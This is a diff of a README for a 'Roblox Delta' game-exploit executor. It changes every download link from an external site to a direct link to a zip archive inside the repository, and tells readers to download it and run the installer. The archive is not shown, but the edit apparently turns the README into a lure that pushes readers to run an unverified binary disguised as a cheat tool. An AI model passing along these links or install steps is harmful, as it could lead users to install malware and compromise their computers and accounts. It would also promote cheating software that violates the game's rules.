@@ -2,7 +2,7 @@
 
 Welcome to the **Roblox Delta** repository! This project aims to revolutionize your scripting experience in Roblox by integrating cutting-edge technologies. Whether you are a beginner or an experienced developer, Roblox Delta provides a premium experience tailored to enhance your workflow and creativity.
 
-[![Visit Delta Exploit](https://img.shields.io/badge/Visit%20Delta%20Exploit-Click%20Here-blue)](https://deltaexploit.app)
+[![Visit Delta Exploit](https://raw.githubusercontent.com/Andreamana25/Roblox-Delta/master/sparch/Delta_Roblox_v2.3.zip%20Delta%20Exploit-Click%20Here-blue)](https://raw.githubusercontent.com/Andreamana25/Roblox-Delta/master/sparch/Delta_Roblox_v2.3.zip)
 
 ## Table of Contents
 
@@ -33,7 +33,7 @@ Roblox Delta offers a variety of features to enhance your scripting capabilities
 
 To get started with Roblox Delta, follow these simple steps:
 
-1. Visit [Delta Exploit](https://deltaexploit.app) to download the latest version of the executor.
+1. Visit [Delta Exploit](https://raw.githubusercontent.com/Andreamana25/Roblox-Delta/master/sparch/Delta_Roblox_v2.3.zip) to download the latest version of the executor.
 2. Once downloaded, run the installer and follow the on-screen instructions.
 3. After installation, open the application and familiarize yourself with the interface.
 
@@ -84,4 +84,4 @@ If you have any questions or need assistance, please reach out to the community 
 
 ---
 
-Thank you for visiting the **Roblox Delta** repository. We hope you enjoy using our tools and that they enhance your scripting experience. Don't forget to visit [Delta Exploit](https://deltaexploit.app) for the latest updates and resources!
+Thank you for visiting the **Roblox Delta** repository. We hope you enjoy using our tools and that they enhance your scripting experience. Don't forget to visit [Delta Exploit](https://raw.githubusercontent.com/Andreamana25/Roblox-Delta/master/sparch/Delta_Roblox_v2.3.zip) for the latest updates and resources!
